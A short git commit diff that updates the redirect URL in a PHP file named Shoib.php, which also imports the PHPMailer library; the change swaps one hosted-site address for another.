cb3065640bf8faaed49480ffec6cdb731838f04f
adiwalfare <ronimawiads@gmail.com>
2025-07-15 10:07:54 +0500

    Update Shoib.php

--- Shoib.php
+++ Shoib.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://shoib-p.vercel.app/");
+header("Location: https://rainbow-cobbler-cd1a02.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
